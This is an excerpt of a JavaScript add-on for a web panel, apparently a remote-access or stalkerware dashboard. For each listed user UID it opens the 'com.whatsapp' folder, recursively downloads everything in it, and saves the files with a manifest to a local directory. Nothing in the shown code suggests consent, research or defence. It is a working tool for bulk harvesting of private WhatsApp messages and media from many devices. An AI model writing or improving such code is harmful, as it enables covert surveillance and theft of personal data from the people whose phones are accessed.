 ...
 *
 * Per user: navigates into the "com.whatsapp" folder and downloads
 * EVERYTHING inside it (recursively). Skips all other folders.
 *
 * On-disk layout:
 *   <chosen-folder>/DingDong_<ts>/<UID - label>/com.whatsapp/<path>/file.ext
 *
 * Drop in: <script src="./script_v5_whatsapp.js"></script>  (AFTER script.js)
 * Requires Chrome / Edge / Opera (Chromium 86+).
 */
(function () {
  "use strict";

  const TARGET_FOLDER = "com.whatsapp"; // <-- only this folder is exported
  ...
  function panel() {
    ...
    p.innerHTML = `
      ...
      <div id="dd-pick">
        ...
        <small>Downloads only <b>${TARGET_FOLDER}</b> per user.<br>Chrome / Edge / Opera required.</small>
      </div>
  ...
  /* ---------- find target folder among current entries ---------- */
  async function findTargetEntry(name) {
    for (let i = 0; i < CFG.FIND_TARGET_TRIES; i++) {
      const li = getEntries().find(x => isFolder(x) && entryName(x).toLowerCase() === name.toLowerCase());
      if (li) return li;
      await sleep(600);
    }
    return null;
  ...
  /* ---------- per-user: enter com.whatsapp then walk it ---------- */
  async function collectUser(u) {
    ...
    upd(u.uid, u.label, `looking for ${TARGET_FOLDER}…`, 8);
    const target = await findTargetEntry(TARGET_FOLDER);
    if (!target) {
      upd(u.uid, u.label, `⚠ ${TARGET_FOLDER} not found`, 0);
      return [];
    }
    ...
    const files = [];
    // path starts with the target folder so it appears on disk
    await walk(u, TARGET_FOLDER + "/", 0, files);
  ...
  async function downloadUser(u, files, userDir) {
    ...
    try {
      await writeFile(userDir, "_manifest.json",
        new Blob([JSON.stringify({ uid: u.uid, label: u.label, folder: TARGET_FOLDER, files: manifest }, null, 2)],
  ...
  async function startFlow() {
    if (S.running) return;
    if (!hasFSA()) { alert("Use Chrome / Edge / Opera (folder write API needed)."); return; }
    try {
      S.rootDir = await window.showDirectoryPicker({ id: "dingdong-wa-export", mode: "readwrite" });
    } catch (_) { return; }
    ...
    S.users = users;
    sum(`Found ${users.length} users — exporting ${TARGET_FOLDER}…`);
